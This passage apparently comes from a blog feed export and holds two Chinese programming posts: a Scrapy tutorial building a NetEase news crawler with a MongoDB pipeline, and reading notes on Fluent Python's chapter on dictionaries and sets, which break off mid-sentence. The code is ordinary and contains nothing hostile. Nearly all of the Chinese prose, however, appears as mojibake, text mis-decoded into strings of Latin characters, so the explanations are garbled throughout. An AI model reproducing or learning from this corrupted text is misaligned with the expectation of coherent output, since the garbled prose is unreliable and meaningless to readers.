ä½†å…¶å®åœ¨å®é™…çš„Pythonå¼€å‘ä¸­, OSXä½¿ç”¨çš„å‘½ä»¤å’Œubuntu/debianå¤§åŒå°å¼‚ã€‚ å®‰è£…scrapy 1sudo pip install scrapy åˆ›å»ºå·¥ç¨‹æ–‡ä»¶å¤¹ 123456789101112scrapy startproject crawlertree crawler.â”œâ”€â”€ crawlerâ”‚ â”œâ”€â”€ __init__.pyâ”‚ â”œâ”€â”€ items.pyâ”‚ â”œâ”€â”€ middlewares.pyâ”‚ â”œâ”€â”€ pipelines.pyâ”‚ â”œâ”€â”€ settings.pyâ”‚ â””â”€â”€ spidersâ”‚ â””â”€â”€ __init__.pyâ””â”€â”€ scrapy.cfg scrapy startproject crawler è¿™è¡Œå‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å·¥ç¨‹æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹çš„ç»“æ„ä½¿ç”¨treeå‘½ä»¤å±•ç¤ºå‡ºæ¥äº†ã€‚è¿™äº›æ–‡ä»¶çš„ä¸»è¦ä½œç”¨: (1) scrapy.cfg é¡¹ç›®çš„é…ç½®æ–‡ä»¶(2) crawler/ :Pythonä»£ç å­˜æ”¾çš„ä½ç½®(3) crawler/items.py: itemsæ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ª(æˆ–å¤šä¸ª)itemçš„å±æ€§(4) crawler/pipelines: é¡¹ç›®çš„ç®¡é“æ–‡ä»¶ã€‚ åœ¨scrapyçš„å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œpipelineçš„ä½œç”¨æ˜¯ï¼š æ¸…æ´—htmlæ•°æ®ï¼› éªŒè¯å·²ç»çˆ¬å–çš„æ•°æ®(æ£€æŸ¥itemæ˜¯å¦æœ‰ç‰¹å®šå±æ€§)ï¼› å»é‡ï¼› å°†çˆ¬å–çš„itemå­˜è¿›æ•°æ®åº“ã€‚ (5) crawler/settings.py é…ç½®æ–‡ä»¶(6) crawler/spiders/ :çˆ¬è™«æ–‡ä»¶çš„ç›®å½• 2. çˆ¬è™«çš„ç¼–å†™2.1 å®šä¹‰Itemç®€å•æ¥è¯´ï¼Œitemçš„ä½œç”¨æ˜¯è£…è½½æŠ“å–åˆ°çš„æ•°æ®ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼å­—å…¸çš„å®¹å™¨ã€‚å®ƒçš„å±æ€§éƒ½ä¼šå®šä¹‰ä¸ºscrapy.item.Fieldå¯¹è±¡ã€‚ ç”±äºæˆ‘ä»¬è¦å†™çš„æ˜¯ä¸€ä¸ªçˆ¬å–æ–°é—»çš„app, é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•°æ®æ˜¯ä»€ä¹ˆï¼Œå¯¹äºä¸€ä¸ªçˆ¬è™«æ¥è¯´, é‡è¦çš„æ˜¯èƒ½å¦å–æˆ‘æ‰€éœ€, è€Œä¸æ˜¯å°½æˆ‘æ‰€èƒ½çˆ¬å–å¯¹åº”ç½‘ç«™çš„æ‰€æœ‰æ•°æ®ã€‚é‚£ä¹ˆå¯¹äºä¸€ä¸ªæ–°é—»çˆ¬è™«ï¼Œæˆ‘ä»¬çˆ¬åˆ°çš„æ¯ä¸€æ¡æ–°é—»éƒ½éœ€è¦ä¸€äº›ä»€ä¹ˆæ ·çš„æ•°æ®å‘¢ï¼Ÿ category æ–°é—»ç±»å‹(æŒ‰ç…§åŒ…å«çš„åª’ä½“ åˆ†ä¸ºå›¾ç‰‡/è§†é¢‘) source_type æ–°é—»æ¥æºçš„ç±»å‹(app, å¾®åš, å¾®ä¿¡, ç½‘ç«™, ç”µå­æŠ¥ etc.) source_name æ–°é—»æ¥æºçš„åç§° news_sign ä¸€æ¡æ–°é—»çš„å”¯ä¸€æ ‡è¯†(å¯ä»¥ç”¨äºå»é‡) views æµè§ˆé‡ title æ ‡é¢˜ url æ–°é—»é“¾æ¥ publish_time å‘å¸ƒæ—¶é—´ text æ–°é—»æ–‡æœ¬ images æ–°é—»å›¾ç‰‡çš„åˆ—è¡¨ ä»¥ä¸Šå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ä¸€äº›æ•°æ®ï¼Œæˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„åˆ—è¡¨å®šä¹‰ä¸€ä¸ªitem 1234567891011121314from scrapy.item import Item, Fieldclass NewsCrawlerItem(Item): category = Field() source_type = Field() source_name = Field() news_sign = Field() views = Field() title = Field() url = Field() publish_time = Field() text = Field() images = Field() 2.2 ç¼–å†™çˆ¬è™«Spideræ˜¯çˆ¬è™«çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç”¨äºä»ä¸€ä¸ª(æˆ–ä¸€ç³»åˆ—)ç½‘ç«™çˆ¬å–æ•°æ®ã€‚è¦å»ºç«‹ä¸€ä¸ªSpiderï¼Œä½ å¿…é¡»ä¸ºscrapy.spider.BaseSpideråˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œå¹¶ç¡®å®šä¸‰ä¸ªä¸»è¦çš„ã€å¼ºåˆ¶çš„å±æ€§ï¼š name çˆ¬è™«åç§°ï¼Œå¿…é¡»æ˜¯å”¯ä¸€çš„ start_urls èµ·å§‹é¡µé¢ parse() è§£æçˆ¬å–åˆ°çš„æ•°æ®æ‰€ç”¨çš„æ–¹æ³•, æ¥å—çš„å”¯ä¸€å‚æ•°æ˜¯scrapy.Requestæ–¹æ³•è¯·æ±‚å¾—åˆ°çš„Responseå¯¹è±¡ 2.2.1 å…³äºäºŒç»´çˆ¬å–ä¸€ä¸ªå…¸å‹çš„çˆ¬è™«åœ¨ä¸¤ä¸ªæ–¹å‘ç§»åŠ¨ï¼š æ°´å¹³æ–¹å‘ï¼šä»ä¸€ä¸ªç´¢å¼•é¡µåˆ°å¦ä¸€ä¸ªç´¢å¼•é¡µ å‚ç›´æ–¹å‘ï¼šä»ç´¢å¼•é¡µé¢åˆ°ä¸‹ä¸€çº§é¡µé¢(å¯èƒ½æ˜¯ä¸‹ä¸€çº§çš„ç´¢å¼•ï¼Œæˆ–è€…å†…å®¹é¡µé¢) è¿™ä¸ªä¾‹å­ä¸­æ°´å¹³æ–¹å‘æ˜¯ç½‘æ˜“æ–°é—»çš„ä¸€é¡µæ–°é—»åˆ°å¦ä¸€é¡µï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªä¸ªçš„æ–°é—»åˆ—è¡¨ï¼›å‚ç›´æ–¹å‘æ˜¯ä»æ–°é—»åˆ—è¡¨é€ä¸ªè¿›å…¥æ–°é—»çš„å†…å®¹ç•Œé¢ 2.2.2 å…³äºä»ç½‘é¡µ(æˆ–è€…HTTPè¯·æ±‚çš„Response Body)ä¸­æå–æ•°æ® html ç½‘é¡µçš„æ•°æ®å¯ä»¥ç”¨ beautifusoup/xpath/æ­£åˆ™ æå– json ç›´æ¥è§£ææˆPythonçš„å­—å…¸å³å¯ xml pythonä¹Ÿæœ‰å¯¹åº”çš„åº“ç”¨äºè§£æ æœ¬æ–‡çš„çˆ¬è™«ä¼šç”¨åˆ°jsonå’Œhtmlè§£æï¼Œè¿™é‡Œhtmlä½¿ç”¨xpathè§£æã€‚ 2.2.3 ä¸€ä¸ªç½‘æ˜“æ–°é—»appçš„Spider1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8import datetimeimport socketimport jsonimport scrapyimport urlparsefrom scrapy.loader.processors import MapCompose, Joinfrom scrapy.loader import ItemLoaderfrom scrapy.http import Requestfrom news_crawler.items import NewsCrawlerItemclass BasicSpider(scrapy.Spider): name = "netease" allowed_domains = ["163.com"] # Start on the first index page chls = [ "T1370583240249", "T1348649145984", "T1348647909107", "T1348648037603", "T1368497029546", "T1348648141035", "T1474271789612", "T1467284926140", "T1492136373327", "T1348648517839", "T1348648650048", "T1498701411149", "T1348648756099", "T1473054348939", "T1356600029035", "T1348649079062", "T1348649503389", "T1348649176279", "T1348649475931", "T1411113472760", "T1486979691117", "T1348649580692", "T1348649654285", "T1348649776727", "T1350383429665", "T1421997195219", "T1456394562871", "T1348654060988", "T1348654085632", "T1491816738487", "T1348654105308", "T1348654151579", "T1348654204705", "T1414389941036", "T1401272877187", "T1385429690972", "T1348654225495", "T1397116135282", "T1444270454635", "T1481105123675", "T1503456682313", "T1464592736048", "T1504171773862", "T1348650593803", "T1348650839000", "T1414142214384", "T1441074311424", "T1482470888760", "T1499853820829", "T1509504918215", "T1502955728035", "T1509448512433", "T1419315959525", "T1419316284722", "T1419316384474", "T1419316531256", "T1427878984398", "T1433137697241", "T1449126525962", "T1456112189138", "T1493374039495", "T1456112438822", "T1468031118349", "T1488432440430", "T1488432474929", "T1504689350701" ] start_urls = ( 'http://c.m.163.com/nc/article/list/%s/0-20.html'%chlid for chlid in chls ) def parse(self, response): # Get the next index URLs and yield Requests url_spl = response.url.split('/') chl_url = '/'.join(url_spl[:-1]) chl_id = url_spl[-2] items = json.loads(response.body)[chl_id] # Get item URLs and yield Requests for item in items: if 'url_3w' in item and item['url_3w']: news_url = item['url_3w'] if '_mobile' not in news_url and '3g.163.com' not in news_url: news_url = news_url.replace('.html', '_mobile.html') yield Request(news_url, callback=self.parse_item, dont_filter=True) if len(items) == 20: page_num = int(url_spl[-1].split('-')[0]) /20 + 1 yield Request(chl_url+'/%d-%d.html'%(page_num*20, page_num*20+20), callback=self.parse, dont_filter=True) def parse_item(self, response): """ This function parses a netease page. @returns item @scrapes category source_type source_name news_sign views title url publish_time text images """ # Create the loader using the response item = NewsCrawlerItem() item['category'] = 'image' item['source_type'] = 'app' item['source_name'] = self.name item['news_sign'] = '' item['views'] = 0 item['url'] = response.url item['title'] = response.xpath('//h1/text()').extract()[0] # Load fields using XPath expressions if '3g.163.com' in response.url: item['publish_time'] = response.xpath('//*[@property="article:published_time"]/@content').extract()[0][:19].replace('T','') item['text'] = ''.join(response.xpath('//*[@class="content"]//p/text()').extract()) item['images'] = response.xpath('//*[@class="content"]//img/@src').extract() item['news_sign'] = 'netease'+response.xpath('//article/@id').extract()[0] else: item['publish_time'] = response.xpath('//*[@id="articleBody"]/div[1]/span[1]/text()').extract()[0] item['text'] = ''.join(response.xpath('//*[@class="article-body"]//p/text()').extract()) item['images'] = response.xpath('//*[@class="article-body"]//img/@src').extract() item['news_sign'] = 'netease'+response.xpath('//*[@id="docId"]/@value').extract()[0] return item 2.2.4 çˆ¬è™«ä»£ç ä»£ç çš„è§£æä¸Šé¢æåˆ°è¿‡parseæ¥å—responseä½œä¸ºå‚æ•°ã€‚è¿™é‡Œé‡ç‚¹è¯´ä¸€ä¸‹parse()æ–¹æ³•ä¸­çš„ä¸¤ä¸ªç”Ÿæˆå™¨yeild,åˆ†åˆ«ä»£è¡¨äº†å‚ç›´çˆ¬å–å’Œæ°´å¹³çˆ¬å–ã€‚é¦–å…ˆè¯´ä¸€ä¸‹Requestå¯¹è±¡: 12345class Request(object_ref): def __init__(self, url, callback=None, method='GET', headers=None, body=None, cookies=None, meta=None, encoding='utf-8', priority=0, dont_filter=False, errback=None, flags=None): è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åˆ°äº†3ä¸ªå‚æ•°,url,callback,dont_filterã€‚æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä½¿ç”¨yeildæ˜¯è¯·æ±‚æ–°é—»çš„å†…å®¹é¡µé¢ï¼Œè¿™é‡Œçš„å›è°ƒå‡½æ•°æ˜¯parse_item()ï¼Œç”¨æ¥æå–å•ä¸ªæ–°é—»çš„ä¿¡æ¯;ç¬¬äºŒæ¬¡ä½¿ç”¨yeildæ˜¯è¯·æ±‚â€œä¸‹ä¸€é¡µâ€çš„æ•°æ®ï¼Œè¿™é‡Œçš„å›è°ƒå‡½æ•°æ˜¯parse(),å½“ç„¶ä»scrapyçš„å®˜æ–¹æ–‡æ¡£æ¥çœ‹ï¼Œè¿™é‡Œä¸ä¼ callbackçš„è¯ï¼Œé»˜è®¤çš„å›è°ƒå‡½æ•°ä¹Ÿæ˜¯parse(),è¿™æ ·ä¸‹ä¸€é¡µçš„æ•°æ®ä¹Ÿä¼šå†ä¸€æ¬¡é€šè¿‡parse()è§£æï¼Œå®ç°æ°´å¹³æ–¹å‘ä¸Šçš„çˆ¬å–ã€‚dont_filteræ˜¯å‘Šè¯‰Requestä¸è¦å¯¹urlè¿›è¡Œè¿‡æ»¤(å»é‡) ä¸‹é¢çš„parse_item()å°±æ˜¯htmlçš„è§£æäº†ï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚ 3 çˆ¬å–åˆ°çš„æ•°æ®å­˜å‚¨è¿™é‡Œæˆ‘ä»¬ç”¨mongoDbå¯¹çˆ¬å–åˆ°çš„æ•°æ®è¿›è¡Œå­˜å‚¨ã€‚ 3.1 é…ç½®MongoDBä¿¡æ¯åœ¨settings.pyä¸­è®¾ç½®MongoDBçš„ä¿¡æ¯ 12345# MongoDB settingsMONGODB_SERVER = "$mongo_server"MONGODB_PORT = 27017MONGODB_DB = "news"MONGODB_COLLECTION = "news_item" è¿™é‡Œserverçš„ipéšå»äº† 3.2 ç¼–å†™MongoDBPipeline123456789101112131415161718192021222324252627from pymongo import MongoClientfrom scrapy.conf import settingsfrom scrapy.exceptions import DropItemfrom scrapy import logclass MongoDBPipeline(object): def __init__(self): client = MongoClient( settings['MONGODB_SERVER'], settings['MONGODB_PORT'] ) news_db = client[settings['MONGODB_DB']] self.collection = news_db[settings['MONGODB_COLLECTION']] def process_item(self, item, spider): valid = True if not item['news_sign']: valid = False raise DropItem("Missing item!") if valid: self.collection.insert(dict(item)) log.msg("news added to MongoDB database!", level=log.INFO, spider=spider) return item è¿™ä¸ªpipelineçš„ä½œç”¨åŒ…æ‹¬ä¸Šé¢æåˆ°çš„éªŒè¯å·²ç»çˆ¬å–çš„æ•°æ®å’Œå°†çˆ¬å–çš„itemå­˜è¿›æ•°æ®åº“ã€‚å»é‡æš‚æ—¶è¿˜æ²¡æœ‰åšå¤„ç†ã€‚ 3.3 é…ç½®pipeline åœ¨settings.pyä¸­æ·»åŠ ä¸‹é¢çš„é…ç½® 123 ITEM_PIPELINES = &#123; 'news_crawler.pipelines.mongodb_ppl.MongoDBPipeline': 300,&#125; å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé”®ä¸ºpipelineçš„è·¯å¾„ï¼Œå€¼ä¸ºä¼˜å…ˆçº§(å€¼è¶Šå°è¶Šä¼˜å…ˆ)ã€‚ 4.æ€»ç»“æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤èµ°ä¸‹æ¥ï¼Œå¤§æ¦‚å°±èƒ½ç¼–å†™å‡ºä¸€ä¸ªç½‘æ˜“æ–°é—»çš„çˆ¬è™«ã€‚è¿™ä¸ªçˆ¬è™«å†™å‡ºæ¥ï¼Œå¤§æ¦‚å°±è¿ˆå‡ºäº†é‡æ„ä»¥å‰çˆ¬è™«ä»£ç çš„ç¬¬ä¸€æ­¥äº† åé¢ç¢°åˆ°ä»€ä¹ˆé—®é¢˜ä¹Ÿä¼šæ›´æ–°ä¸Šæ¥çš„ï¼Œæ•¬è¯·æœŸå¾…]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>scrapy</tag>
        <tag>crawler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬ä¸‰ç« å°è®°]]></title>
    <url>%2F2017%2F11%2F23%2Ffluent-python-3%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬ä¸‰ç« è¯»ä¹¦æŠ¥å‘Š Chapter 3. Dictionaries and Setså­—å…¸å’Œé›†åˆdict ç±»å‹ä¸ä½†åœ¨å„ç§ç¨‹åºé‡Œå¹¿æ³›ä½¿ç”¨ï¼Œå®ƒä¹Ÿæ˜¯ Python è¯­è¨€çš„åŸºçŸ³ã€‚æ¨¡å—çš„å‘½åç©ºé—´ã€å®ä¾‹çš„å±æ€§å’Œå‡½æ•°çš„å…³é”®å­—å‚æ•°ä¸­éƒ½å¯ä»¥çœ‹åˆ°å­—å…¸çš„èº«å½±ã€‚è·Ÿå®ƒæœ‰å…³çš„å†…ç½®å‡½æ•°éƒ½åœ¨__builtins__.__dict__æ¨¡å—ä¸­ã€‚Python å¯¹å­—å…¸åšäº†é«˜åº¦ä¼˜åŒ–ï¼Œpythonå­—å…¸æ€§èƒ½ä¼˜ç§€çš„åŸå› æ˜¯æ•£åˆ—è¡¨ã€‚é›†åˆåŒæ ·ä¾èµ–æ•£åˆ—è¡¨ã€‚ *æœ‰éƒ¨åˆ†ç¿»è¯‘å­˜åœ¨ç–‘é—®ï¼Œç”¨æ‹¬å·æ ‡æ³¨åŸè‹±æ–‡æ­£æ–‡ã€‚ æ³›æ˜ å°„ç±»å‹collections.abc æ¨¡å—ä¸­æœ‰ Mapping å’Œ MutableMapping è¿™ä¸¤ä¸ªæŠ½è±¡åŸºç±»,å®ƒä»¬çš„ä½œç”¨æ˜¯ä¸º dict å’Œå…¶ä»–ç±»ä¼¼çš„ç±»å‹å®šä¹‰å½¢å¼æ¥å£ã€‚éæŠ½è±¡æ˜ å°„ç±»å‹ä¸€èˆ¬ä¸ä¼šç›´æ¥ç»§æ‰¿è¿™äº›æŠ½è±¡åŸºç±»ï¼Œå®ƒä»¬ä¼šç›´æ¥å¯¹ dict æˆ–æ˜¯collections.User.Dict è¿›è¡Œæ‰©å±•ã€‚è¿™äº›æŠ½è±¡åŸºç±»çš„ä¸»è¦ä½œç”¨æ˜¯ä½œä¸ºå½¢å¼åŒ–çš„æ–‡æ¡£ã€‚ æ ‡å‡†åº“é‡Œçš„æ‰€æœ‰æ˜ å°„ç±»å‹éƒ½æ˜¯åˆ©ç”¨ dict æ¥å®ç°çš„ï¼Œå› åªæœ‰å¯æ•£åˆ—çš„æ•°æ®ç±»å‹æ‰èƒ½ç”¨ä½œè¿™äº›æ˜ å°„é‡Œçš„é”®ã€‚ å¯æ•£åˆ—çš„æ•°æ®ç±»å‹å¦‚æœä¸€ä¸ªå¯¹è±¡æ˜¯å¯æ•£åˆ—çš„ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œå®ƒçš„æ•£åˆ—å€¼æ˜¯ä¸å˜çš„ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡éœ€è¦å®ç° __hash__() æ–¹æ³•ã€‚å¦å¤–å¯æ•£åˆ—å¯¹è±¡è¿˜è¦æœ‰__eq__() æ–¹æ³•ï¼Œè¿™æ ·æ‰èƒ½è·Ÿå…¶ä»–é”®åšæ¯”è¾ƒã€‚ Pythonæ–‡æ¡£https://docs.python.org/3/glossary.html#term-hashableä¸­æåˆ°ï¼Œæ‰€æœ‰ä¸å¯å˜çš„ç±»å‹éƒ½æ˜¯å¯æ•£åˆ—çš„ï¼Œä½†å…ƒç»„æ˜¯ä¸€ä¸ªä¾‹å¤–ï¼Œå…ƒç»„å¯æ•£åˆ—çš„æ¡ä»¶æ˜¯å…ƒç»„çš„å…ƒç´ éƒ½å¯ä»¥æ•£åˆ—ã€‚ä¸€ä¸ªå¯¹è±¡å¯æ•£åˆ—çš„æ¡ä»¶æ˜¯ï¼šå¦‚æœä¸€ä¸ªå¯¹è±¡å®ç°äº†__eq__æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨æ–¹æ³•ä¸­ç”¨åˆ°äº†è¿™ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€çš„è¯ï¼Œé‚£ä¹ˆåªæœ‰å½“æ‰€æœ‰è¿™äº›å†…éƒ¨çŠ¶æ€éƒ½æ˜¯ä¸å¯å˜çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¯¹è±¡æ‰æ˜¯å¯æ•£åˆ—çš„ã€‚ åˆ›å»ºå­—å…¸çš„ä¸åŒæ–¹å¼1234567&gt;&gt;&gt; a = dict(one=1, two=2, three=3)&gt;&gt;&gt; b = &#123;'one': 1, 'two': 2, 'three': 3&#125;&gt;&gt;&gt; c = dict(zip(['one', 'two', 'three'], [1, 2, 3]))&gt;&gt;&gt; d = dict([('two', 2), ('one', 1), ('three', 3)])&gt;&gt;&gt; e = dict(&#123;'three': 3, 'one': 1, 'two': 2&#125;)&gt;&gt;&gt; a == b == c == d == eTrue é™¤æ­¤ä¹‹å¤–ï¼Œå­—å…¸æ¨å¯¼ä¹Ÿèƒ½åˆ›å»ºä¸€ä¸ªå­—å…¸, å’Œåˆ—è¡¨æ¨å¯¼ç±»ä¼¼ 12345678910111213&gt;&gt;&gt; DIAL_CODES = [ ... (86, 'China'),... (91, 'India'),... (1, 'United States'),... (62, 'Indonesia'),... (55, 'Brazil'),... (92, 'Pakistan'),... (880, 'Bangladesh'),... (234, 'Nigeria'),... (7, 'Russia'),... (81, 'Japan'),... ]&gt;&gt;&gt; country_code = &#123;country: code for code, country in DIAL_CODES&#125; å¸¸ç”¨çš„æ˜ å°„æ–¹æ³•è¿™é‡Œè®²åˆ°ä¸€ä¸ªèƒ½è®©ç¨‹åºæ›´åŠ é«˜æ•ˆçš„æ–¹æ³• setdefault()ï¼Œèƒ½èŠ‚çœå¾ˆå¤šæ¬¡çš„é”®æŸ¥è¯¢ã€‚ ä¾‹å¦‚ï¼š2.1: 1my_dict.setdefault(key, []).append(new_value) 2.2 123if key not in my_dict: my_dict[key] = []my_dict[key].append(new_value) æ“ä½œ2.1å’Œ2.2è¾¾åˆ°çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯2.1åªç”¨äº†ä¸€æ¬¡é”®æŸ¥è¯¢ï¼Œè€Œ2.2ä¼šç”¨åˆ°2-3æ¬¡(æ˜¯å¦æœ‰keyå­˜åœ¨) æ˜ å°„çš„å¼¹æ€§é”®æŸ¥è¯¢(flexible key lookup)åœºæ™¯ï¼šä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œå°±ç®—æŸä¸ªé”®åœ¨æ˜ å°„é‡Œä¸å­˜åœ¨ï¼Œæˆ‘ä»¬ä¹Ÿå¸Œæœ›åœ¨é€šè¿‡è¿™ä¸ªé”®è¯»å–å€¼çš„æ—¶å€™èƒ½å¾—åˆ°ä¸€ä¸ªé»˜è®¤å€¼ã€‚æœ‰ä¸¤ä¸ªæ–¹æ³•èƒ½å®ç°ï¼šä½¿ç”¨defaultdictç±»æˆ–è€…è‡ªå·±å®ç°ä¸€ä¸ªç±»ç»§æ‰¿dict,å®ç°__missing__æ–¹æ³•ã€‚ defaultdictæœ‰ä¸€ä¸ªæ–°å­—å…¸dd = defaultdict(list),å½“ä½¿ç”¨è¡¨è¾¾å¼dd[key]è€Œkeyåœ¨defaultdictä¸­ä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šç”¨list()å»ºç«‹æ–°åˆ—è¡¨ä½œä¸ºå€¼ï¼Œkeyä½œä¸ºé”®æ”¾å…¥ddä¸­ï¼Œç„¶åè¿”å›è¿™ä¸ªåˆ—è¡¨çš„å¼•ç”¨ã€‚è¿™ä¸ªç”¨æ¥ç”Ÿæˆé»˜è®¤å€¼çš„å¯è°ƒç”¨å¯¹è±¡æ”¾åœ¨default_factoryè¿™ä¸ªå®ä¾‹å±æ€§ä¸­ã€‚ ç‰¹æ®Šæ–¹æ³• __missing__()å½“ä¸€ä¸ªç»§æ‰¿äº†dictçš„ç±»å®ç°äº†__missing__æ–¹æ³•ï¼Œåœ¨æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„æ—¶å€™å°±ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåªæœ‰__getitem__æ–¹æ³•ä¼šè°ƒç”¨__missing__æ–¹æ³•ã€‚ å­—å…¸çš„å˜ç§ collections.OrderedDict:è¿™ä¸ªç±»çš„å¯¹è±¡åœ¨æ·»åŠ é”®çš„æ—¶å€™ä¼šä¿æŒé¡ºåºï¼Œé”®çš„è¿­ä»£é¡ºåºæ€»æ˜¯ä¸€æ ·çš„ collections,ChainMap:å¯ä»¥å®¹çº³æ•°ä¸ªæ˜ å°„å¯¹è±¡ï¼Œè¿›è¡Œé”®æŸ¥è¯¢çš„æ—¶å€™ä¼šé€ä¸ªæŸ¥è¯¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ã€‚ collections.Counter: æ¯æ¬¡æ›´æ–°ä¸€ä¸ªé”®çš„æ—¶å€™å°±ä¼šå¢åŠ è¿™ä¸ªé”®çš„è®¡æ•°å™¨, æ¯”è¾ƒæœ‰ç”¨çš„æ–¹æ³•æ˜¯most_common(n) æŒ‰æ¬¡åºè¿”å›æœ€å¸¸è§çš„nä¸ªé”®å’Œä»–ä»¬çš„è®¡æ•°ã€‚ collections.UserDict: æŠŠæ ‡å‡†dictç”¨Pythonå®ç°ç”¨äºç”¨æˆ·ç»§æ‰¿è¿™ä¸ªç±»ï¼Œç¼–å†™å­ç±»ã€‚ ç»§æ‰¿UserDictç¼–å†™å­ç±»æ›´å€¾å‘äºä» UserDict è€Œä¸æ˜¯ä» dict ç»§æ‰¿çš„ä¸»è¦åŸå› æ˜¯ï¼Œåè€…æœ‰æ—¶ä¼šåœ¨æŸäº›æ–¹æ³•çš„å®ç°ä¸Šèµ°ä¸€äº›æ·å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸å¾—ä¸åœ¨å®ƒçš„å­ç±»ä¸­é‡å†™è¿™äº›æ–¹æ³•ï¼Œä½†æ˜¯ UserDict å°±ä¸ä¼šå¸¦æ¥è¿™äº›é—®é¢˜ã€‚ 12345678910import collectionsclass StrKeyDict(collections.UserDict): def __missing__(self, key): if isinstance(key, str): raise KeyError(key) return self[str(key)] def __contains__(self, key): return str(key) in self.data def __setitem__(self, key, item): self.data[str(key)] = item UserDict ä¸­æœ‰ä¸€ä¸ªå±æ€§å«åšdata,å®ƒæ˜¯dict çš„ä¸€ä¸ªå®ä¾‹ï¼Œç”¨äºå­˜å‚¨æ•°æ®ã€‚ ä¸å¯å˜çš„æ˜ å°„ç±»å‹æ ‡å‡†åº“é‡Œæ‰€æœ‰çš„æ˜ å°„ç±»å‹éƒ½æ˜¯å¯å˜çš„ï¼Œä½†æœ‰æ—¶å€™ä¹Ÿä¼šæœ‰éœ€è¦ç”¨åˆ°ä¸å¯å˜æ˜ å°„çš„åœ°æ–¹ï¼Œä¾‹å¦‚ä¸èƒ½è®©ç”¨æˆ·ä¿®æ”¹çš„æ˜ å°„ã€‚ Python 3.3 å¼€å§‹ï¼Œtypes æ¨¡å—ä¸­å¼•å…¥äº†ä¸€ä¸ªå°è£…ç±»åå« MappingProxyTypeã€‚å¦‚æœç»™è¿™ä¸ªç±»ä¸€ä¸ªæ˜ å°„ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªåªè¯»çš„æ˜ å°„è§†å›¾ã€‚è™½ç„¶æ˜¯ä¸ªåªè¯»è§†å›¾ï¼Œä½†æ˜¯å®ƒæ˜¯åŠ¨æ€çš„ã€‚è¿™æ„å‘³ç€å¦‚æœå¯¹åŸæ˜ å°„åšå‡ºäº†æ”¹åŠ¨ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªè§†å›¾å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡è¿™ä¸ªè§†å›¾å¯¹åŸæ˜ å°„åšå‡ºä¿®æ”¹ã€‚ * ä½•ä¸ºå‰¯æœ¬ï¼Ÿä½•ä¸ºè§†å›¾ï¼Ÿå‰¯æœ¬ï¼šå°±æ˜¯åŸæœ‰æ•°æ®çš„ä¸€ä»½æ‹·è´ã€‚è§†å›¾ï¼šå¯ç†è§£ä¸ºåŸæœ‰æ•°æ®çš„ä¸€ä¸ªåˆ«ç§°æˆ–å¼•ç”¨ï¼Œé€šè¿‡è¯¥åˆ«ç§°æˆ–å¼•ç”¨äº¦ä¾¿å¯è®¿é—®ã€æ“ä½œåŸæœ‰æ•°æ®ï¼Œä½†åŸæœ‰æ•°æ®ä¸ä¼šäº§ç”Ÿæ‹·è´ã€‚ é›†åˆé›†åˆçš„æœ¬è´¨æ˜¯è®¸å¤šå”¯ä¸€å¯¹è±¡çš„èšé›†ï¼Œæ‰€ä»¥é›†åˆçš„å…¶ä¸­ä¸€ä¸ªç”¨é€”æ˜¯å»é‡ã€‚ é›†åˆè¿˜å®ç°äº†å¾ˆå¤šåŸºç¡€çš„ä¸­ç¼€è¿ç®—ç¬¦ã€‚ç»™å®šä¸¤ä¸ªé›†åˆ a å’Œ bï¼Œa | b è¿”å›çš„æ˜¯å®ƒä»¬çš„åˆé›†ï¼Œa &amp; b å¾—åˆ°çš„æ˜¯äº¤é›†ï¼Œè€Œ a - b å¾—åˆ°çš„æ˜¯å·®é›†ã€‚åˆç†åœ°åˆ©ç”¨è¿™äº›æ“ä½œï¼Œä¸ä»…èƒ½å¤Ÿè®©ä»£ç çš„è¡Œæ•°å˜å°‘ï¼Œè¿˜èƒ½å‡å°‘ Python ç¨‹åºçš„è¿è¡Œæ—¶é—´ã€‚è¿™æ ·åšåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†è®©ä»£ç æ›´æ˜“è¯»ã€‚ é™¤äº†é€Ÿåº¦æå¿«çš„æŸ¥æ‰¾åŠŸèƒ½ï¼ˆè¿™ä¹Ÿå¾—å½’åŠŸäºå®ƒèƒŒåçš„æ•£åˆ—è¡¨ï¼‰ï¼Œå†…ç½®çš„ set å’Œ 